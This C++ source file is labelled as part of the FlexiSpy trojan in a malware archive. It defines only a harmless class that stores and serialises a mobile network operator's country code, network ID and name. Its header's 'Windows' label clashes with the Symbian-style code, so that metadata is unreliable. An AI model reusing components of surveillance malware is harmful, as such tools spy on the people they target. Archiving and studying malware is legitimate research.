/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#include "NetOperator.h"
#include <S32STRM.H>

TNetOperatorInfo::TNetOperatorInfo()
	{
	iCountryCode.SetLength(0);
	iNetworkId.SetLength(0);
	iLongName.SetLength(0);	
	}
	
TBool TNetOperatorInfo::IsEmpty()
	{
	return iCountryCode.Length() == 0 && iNetworkId.Length() == 0;
	}

void TNetOperatorInfo::ExternalizeL(RWriteStream& aOut) const
	{
	aOut << iCountryCode;
	aOut << iNetworkId;
	aOut << iLongName;
	}
	
void TNetOperatorInfo::InternalizeL(RReadStream& aIn)
	{	
	aIn >> iCountryCode;
	aIn >> iNetworkId;
	aIn >> iLongName;
	}	
